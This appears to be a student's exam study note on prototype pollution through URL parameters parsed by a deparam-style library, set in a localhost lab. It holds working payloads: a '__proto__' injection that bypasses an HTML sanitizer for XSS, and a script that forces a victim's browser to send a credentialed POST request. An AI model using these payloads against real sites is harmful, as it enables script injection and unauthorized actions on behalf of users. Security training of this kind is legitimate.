# Prototype Pollution Attack via URL Parameters (Concise Summary)

> [!summary]  
> This document summarizes key points about exploiting prototype pollution using URL parameters, specifically via the `deparam` library.

---

## Core Concepts

- **Prototype Pollution** occurs when an attacker injects properties (e.g., `__proto__`) into JavaScript objects, affecting all other objects inheriting from the polluted prototype.
    
- **dparam** library converts URL query strings into nested JavaScript objects, enabling attackers to inject prototype pollution payloads directly via URLs.
    
- **Object.assign()** merges user-supplied objects into existing objects, facilitating the propagation of polluted properties.
    

> [!important]  
> Key flow: URL Input → dparam Parsing → Object.assign() → Prototype Pollution

---

## Vulnerability Explanation

Normal URL parsing (`URLSearchParams`) creates:

```javascript
// URL: ?__proto__.polluted=true
{"__proto__.polluted": "true"} // harmless string key
```

Using `dparam`, parsing creates:

```javascript
// URL: ?__proto__.polluted=true
{
  __proto__: { polluted: "true" }
} // dangerous nested object
```

> [!danger]  
> `dparam` converts query strings into actual objects, not strings, directly enabling prototype pollution.

---

## Verifying Prototype Pollution

Check via browser console:

```javascript
console.log({}.polluted); // true indicates pollution success
```

Payload example:

```
http://localhost:3000/dashboard?__proto__.polluted=true
```

---

## Bypassing Sanitization (XSS Attack)

Direct attempt (blocked by `sanitizeHTML`):

```
/dashboard?message=<script>alert(1)</script>
```

Bypassing via polluted prototype:

```
/dashboard?__proto__.message=<script>alert(1)</script>
```

> [!danger]  
> This bypasses sanitization because `mergedSettings` inherits the polluted prototype property.

---

## Exploiting Application Functionality

- Intercept a legitimate POST request (task creation) using Burp Suite:
    

```http
title=important+task&status=pending&priority=high
```

- Create JavaScript payload (`payload.js`):
    

```javascript
<script>
fetch("http://localhost:3000/tasks/create", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "title=important+task&status=pending&priority=high",
  credentials: "include"
});
</script>
```

- URL-encode and inject via:
    

```
/dashboard?__proto__.message=[encoded_payload]
```

Victim visiting the URL executes the unauthorized POST request.

> [!caution]  
> Always verify payload functionality in your own session first.

---

## Manual Exploitation Workflow

1. Identify URL parsing (`dparam`) and merging functions (`Object.assign`).
    
2. Confirm reflection and sanitization.
    
3. Inject payload via polluted `__proto__` property.
    
4. Escalate to application-level abuse (XSS, unauthorized actions).
    

---

## Exam Reminders

> [!important]  
> Critical points for your exam:

- `__proto__` pollution alters global object behavior.
    
- `dparam` specifically facilitates URL-based prototype pollution.
    
- Prototype pollution bypasses sanitization and input validation.
    
- Example verification payload:
    

```
?__proto__.polluted=true
```

- XSS Payload:
    

```
?__proto__.message=<script>alert(1)</script>
```

---

## Further References

- [PayloadAllTheThings – Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Injections/Prototype%20Pollution)
    
- [MDN: Object.assign()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/assign)
    
- [OWASP: Prototype Pollution](https://owasp.org/www-community/attacks/Prototype_Pollution)
    
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
    